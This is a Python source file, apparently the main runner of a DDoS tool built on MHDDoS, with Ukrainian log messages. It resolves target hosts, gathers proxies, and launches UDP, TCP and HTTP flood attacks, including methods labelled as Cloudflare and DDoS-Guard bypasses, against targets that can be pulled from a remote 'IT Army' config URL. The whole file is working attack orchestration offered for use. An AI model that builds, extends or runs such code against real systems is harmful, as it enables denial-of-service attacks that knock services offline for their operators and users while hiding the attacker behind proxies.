import queue
from collections import namedtuple
from concurrent.futures import Future
from concurrent.futures.thread import _WorkItem
from threading import Event, Thread
from time import sleep, time

from yarl import URL

from src.cli import init_argparse
from src.core import IT_ARMY_CONFIG_URL, LOW_RPC, UDP_THREADS, cl, logger
from src.dns_utils import get_resolvable_targets, resolve_host
from src.mhddos import main as mhddos_main
from src.output import AtomicCounter, print_banner, print_progress, show_statistic
from src.proxies import update_proxies
from src.targets import Targets

Params = namedtuple("Params", "url, ip, method, threads")


class DaemonThreadPool:
    def __init__(self, num_threads):
        self._queue = queue.SimpleQueue()
        for cnt in range(num_threads):
            try:
                Thread(target=self._worker, daemon=True).start()
            except RuntimeError:
                logger.warning(
                    f"{cl.RED}Не вдалося запустити усі {num_threads} потоків - максимум {cnt - 50}{cl.RESET}"
                )
                exit()

    def submit(self, fn, *args, **kwargs):
        f = Future()
        w = _WorkItem(f, fn, args, kwargs)
        self._queue.put(w)
        return f

    def _worker(self):
        while True:
            work_item = self._queue.get(block=True)
            if work_item is not None:
                work_item.run()
                del work_item


def run_ddos(
    thread_pool,
    proxies,
    targets,
    total_threads,
    period,
    rpc,
    http_methods,
    vpn_mode,
    proxy_timeout,
    debug,
    table,
):
    threads_per_target = total_threads // len(targets)
    params_list = []
    for target in targets:
        ip = resolve_host(target)
        target = URL(target)
        # UDP
        if target.scheme == "udp":
            params_list.append(Params(target, ip, "UDP", UDP_THREADS))

        # TCP
        elif target.scheme == "tcp":
            params_list.append(Params(target, ip, "TCP", threads_per_target))

        # HTTP(S)
        else:
            threads = threads_per_target // len(http_methods)
            for method in http_methods:
                params_list.append(Params(target, ip, method, threads))

    logger.info(f"{cl.GREEN}Запускаємо атаку...{cl.RESET}")
    statistics = {}
    event = Event()
    event.set()
    for params in params_list:
        thread_statistics = {"requests": AtomicCounter(), "bytes": AtomicCounter()}
        statistics[params] = thread_statistics
        kwargs = {
            **params._asdict(),
            "rpc": rpc,
            "sock_timeout": proxy_timeout,
            "thread_pool": thread_pool,
            "event": event,
            "statistics": thread_statistics,
            "proxies": proxies,
        }
        mhddos_main(**kwargs)
        if not table:
            logger.info(
                f"{cl.YELLOW}Атакуємо{cl.BLUE} {params.url.host}{cl.YELLOW} "
                f"методом{cl.BLUE} {params.method}{cl.YELLOW}, "
                f"потоків:{cl.BLUE} {params.threads}{cl.YELLOW}!{cl.RESET}"
            )

    if not (table or debug):
        print_progress(period, 0, len(proxies))
        sleep(period)
    else:
        ts = time()
        refresh_rate = 4 if table else 2
        sleep(refresh_rate)
        while True:
            passed = time() - ts
            if passed > period:
                break
            show_statistic(statistics, refresh_rate, table, vpn_mode, len(proxies), period, passed)
            sleep(refresh_rate)
    event.clear()


def start(
    total_threads,
    period,
    targets_iter,
    rpc,
    proxy_timeout,
    http_methods,
    vpn_mode,
    debug,
    table,
):
    if table:
        debug = False

    for bypass in ("CFB", "DGB", "BYPASS"):
        if bypass in http_methods:
            logger.warning(
                f"{cl.RED}Робота методу {bypass} не гарантована - атака методами за "
                f"замовчуванням може бути ефективніша{cl.RESET}"
            )

    thread_pool = DaemonThreadPool(total_threads)
    while True:
        targets = list(get_resolvable_targets(targets_iter))
        if not targets:
            logger.error(f"{cl.RED}Не знайдено жодної доступної цілі{cl.RESET}")
            exit()

        if rpc < LOW_RPC:
            logger.warning(
                f"{cl.RED}RPC менше за {LOW_RPC}. Це може призвести до падіння продуктивності "
                f"через збільшення кількості перепідключень{cl.RESET}"
            )

        no_proxies = vpn_mode or all(target.lower().startswith("udp://") for target in targets)
        proxies = []
        if not no_proxies:
            proxies = update_proxies(thread_pool, period, targets, proxy_timeout)
        run_ddos(
            thread_pool,
            proxies,
            targets,
            total_threads,
            period,
            rpc,
            http_methods,
            vpn_mode,
            proxy_timeout,
            debug,
            table,
        )


if __name__ == "__main__":
    args = init_argparse().parse_args()
    print_banner(args.vpn_mode)
    if args.itarmy:
        targets = Targets([], IT_ARMY_CONFIG_URL)
    else:
        targets = Targets(args.targets, args.config)

    start(
        args.threads,
        args.period,
        targets,
        args.rpc,
        args.proxy_timeout,
        args.http_methods,
        args.vpn_mode,
        args.debug,
        args.table,
    )
